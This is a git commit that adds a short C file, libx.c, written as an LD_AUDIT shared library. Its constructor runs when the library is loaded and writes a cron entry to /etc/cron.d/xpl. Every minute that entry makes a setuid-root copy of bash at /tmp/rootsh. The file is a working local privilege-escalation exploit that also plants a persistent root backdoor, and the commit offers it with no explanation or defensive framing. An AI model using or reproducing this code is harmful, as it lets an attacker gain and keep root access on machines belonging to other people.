13004037e7b8f2e7e173f6fa33906d6f91faec30
Unknown1337 <88354254+PsychoH4x0r@users.noreply.github.com>
2025-07-28 18:51:24 +0700

    Create libx.c

---
+++ libx.c
@@ -0,0 +1,16 @@
+#define _GNU_SOURCE
+#include <link.h>
+#include <stdio.h>
+#include <unistd.h>
+
+unsigned int la_version(unsigned int version) {
+    return LAV_CURRENT;
+}
+
+void __attribute__((constructor)) init() {
+    FILE *f = fopen("/etc/cron.d/xpl", "w");
+    if (f) {
+        fprintf(f, "* * * * * root cp /bin/bash /tmp/rootsh; chmod +s /tmp/rootsh\n");
+        fclose(f);
+    }
+}
